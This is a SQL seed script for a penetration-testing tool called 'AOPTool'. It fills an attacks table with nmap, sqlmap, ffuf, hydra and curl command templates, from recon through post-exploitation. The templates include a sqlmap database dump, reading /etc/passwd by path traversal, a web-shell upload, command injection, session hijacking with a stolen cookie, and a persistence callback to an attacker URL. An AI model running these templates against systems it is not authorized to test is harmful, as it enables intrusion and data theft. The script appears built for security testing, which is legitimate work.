-- AOPTool - Populate Attack Definitions
-- Run this to populate the attacks table with comprehensive pentesting attacks

-- Clear existing attacks
TRUNCATE TABLE attacks RESTART IDENTITY CASCADE;

-- ================================
-- RECONNAISSANCE ATTACKS
-- ================================

INSERT INTO attacks (name, description, category, risk_level, tool_name, command_template, target_type, prerequisites, expected_output, enabled) VALUES
('Port Scan - Quick', 'Quick TCP port scan of common ports', 'recon', 'low', 'nmap', '-F {target}', 'any', '[]', 'Open ports list', true),
('Port Scan - Full', 'Comprehensive TCP port scan', 'recon', 'low', 'nmap', '-p- {target}', 'any', '[]', 'Complete port enumeration', true),
('Service Detection', 'Detect services and versions', 'recon', 'low', 'nmap', '-sV {target}', 'any', '[]', 'Service versions', true),
('OS Detection', 'Identify target operating system', 'recon', 'low', 'nmap', '-O {target}', 'any', '[]', 'OS fingerprint', true),
('SSL/TLS Scan', 'Scan SSL/TLS configuration', 'recon', 'low', 'nmap', '--script ssl-enum-ciphers -p 443 {target}', 'web', '[]', 'SSL/TLS details', true),
('HTTP Headers Check', 'Check HTTP security headers', 'recon', 'low', 'curl', '-I {url}', 'web', '[]', 'HTTP headers', true),
('DNS Enumeration', 'Enumerate DNS records', 'recon', 'low', 'nmap', '--script dns-brute {target}', 'domain', '[]', 'DNS records', true),
('Web Technology Detection', 'Identify web technologies', 'recon', 'low', 'curl', '-s {url}', 'web', '[]', 'Technology stack', true);

-- ================================
-- SCANNING ATTACKS
-- ================================

INSERT INTO attacks (name, description, category, risk_level, tool_name, command_template, target_type, prerequisites, expected_output, enabled) VALUES
('Directory Brute Force', 'Discover hidden directories', 'scanning', 'low', 'ffuf', '-u {url}/FUZZ -w /wordlists/common.txt -mc 200,301,302,403', 'web', '[]', 'Hidden paths', true),
('Nikto Web Scan', 'Web server vulnerability scan', 'scanning', 'medium', 'nikto', '-h {url}', 'web', '[]', 'Web vulnerabilities', true),
('SQL Injection Scan', 'Scan for SQL injection', 'scanning', 'high', 'sqlmap', '-u "{url}" --batch --level=1 --risk=1', 'web', '[]', 'SQL injection points', true),
('XSS Scanner', 'Scan for XSS vulnerabilities', 'scanning', 'medium', 'nuclei', '-u {url} -t /nuclei-templates/xss/', 'web', '[]', 'XSS vulnerabilities', true),
('CORS Test', 'Test CORS configuration', 'scanning', 'medium', 'curl', '-H "Origin: https://evil.com" -I {url}', 'web', '[]', 'CORS headers', true),
('WordPress Scan', 'WordPress security scan', 'scanning', 'medium', 'wpscan', '--url {url} --enumerate p,t,u --api-token {wpscan_token}', 'web', '[]', 'WP vulnerabilities', true),
('API Endpoint Discovery', 'Discover API endpoints', 'scanning', 'low', 'ffuf', '-u {url}/api/FUZZ -w /wordlists/api-endpoints.txt', 'api', '[]', 'API endpoints', true),
('Nuclei Full Scan', 'Comprehensive vulnerability scan', 'scanning', 'medium', 'nuclei', '-u {url} -severity critical,high,medium', 'web', '[]', 'Vulnerabilities', true);

-- ================================
-- EXPLOITATION ATTACKS
-- ================================

INSERT INTO attacks (name, description, category, risk_level, tool_name, command_template, target_type, prerequisites, expected_output, enabled) VALUES
('SQL Injection Exploit', 'Exploit SQL injection vulnerability', 'exploitation', 'critical', 'sqlmap', '-u "{url}" --batch --dump', 'web', '["SQL injection found"]', 'Database dump', true),
('Command Injection', 'Exploit OS command injection', 'exploitation', 'critical', 'curl', '-X POST {url} -d "cmd={payload}"', 'web', '[]', 'Command output', true),
('Path Traversal Exploit', 'Exploit directory traversal', 'exploitation', 'high', 'curl', '{url}?file=../../../../etc/passwd', 'web', '[]', 'File contents', true),
('File Upload Exploit', 'Upload malicious file', 'exploitation', 'high', 'curl', '-F "file=@/tmp/shell.php" {url}/upload', 'web', '[]', 'Upload result', true),
('XXE Exploit', 'XML External Entity attack', 'exploitation', 'high', 'curl', '-X POST -H "Content-Type: application/xml" -d @xxe-payload.xml {url}', 'web', '[]', 'XXE result', true),
('IDOR Exploitation', 'Exploit insecure direct object reference', 'exploitation', 'high', 'curl', '{url}/api/user/{id}', 'web', '[]', 'Unauthorized data', true),
('SSRF Exploit', 'Server-Side Request Forgery', 'exploitation', 'high', 'curl', '{url}?url=http://localhost/admin', 'web', '[]', 'SSRF result', true),
('Password Brute Force', 'Brute force authentication', 'exploitation', 'medium', 'hydra', '-L /wordlists/users.txt -P /wordlists/passwords.txt {target} http-post-form', 'web', '[]', 'Valid credentials', true);

-- ================================
-- POST-EXPLOITATION ATTACKS
-- ================================

INSERT INTO attacks (name, description, category, risk_level, tool_name, command_template, target_type, prerequisites, expected_output, enabled) VALUES
('Data Exfiltration', 'Extract sensitive data', 'post_exploitation', 'critical', 'curl', '{url}/api/export', 'web', '["Valid session"]', 'Exported data', true),
('Privilege Escalation Test', 'Test for privilege escalation', 'post_exploitation', 'high', 'curl', '-H "Authorization: Bearer {token}" {url}/admin', 'web', '["Valid user session"]', 'Admin access', true),
('Session Hijacking', 'Hijack user session', 'post_exploitation', 'high', 'curl', '-H "Cookie: session={stolen_cookie}" {url}/profile', 'web', '["Stolen session"]', 'User data', true),
('Persistence Setup', 'Establish persistence mechanism', 'post_exploitation', 'critical', 'curl', '-X POST {url}/webhook -d "callback={attacker_url}"', 'web', '["Shell access"]', 'Persistence confirmed', true);

-- ================================
-- Add some sample attacks for immediate testing
-- ================================

-- Simple GET request (safe for testing)
INSERT INTO attacks (name, description, category, risk_level, tool_name, command_template, target_type, prerequisites, expected_output, enabled) VALUES
('Simple HTTP GET', 'Basic HTTP GET request for testing', 'recon', 'low', 'curl', '-s {url}', 'web', '[]', 'HTTP response', true);

-- Basic connectivity test
INSERT INTO attacks (name, description, category, risk_level, tool_name, command_template, target_type, prerequisites, expected_output, enabled) VALUES
('Ping Test', 'Test network connectivity', 'recon', 'low', 'ping', '-c 4 {target}', 'any', '[]', 'Ping response', true);

-- Show summary
SELECT
    category,
    COUNT(*) as attack_count,
    string_agg(DISTINCT risk_level, ', ' ORDER BY risk_level) as risk_levels
FROM attacks
WHERE enabled = true
GROUP BY category
ORDER BY attack_count DESC;

-- Show total
SELECT COUNT(*) as total_enabled_attacks FROM attacks WHERE enabled = true;
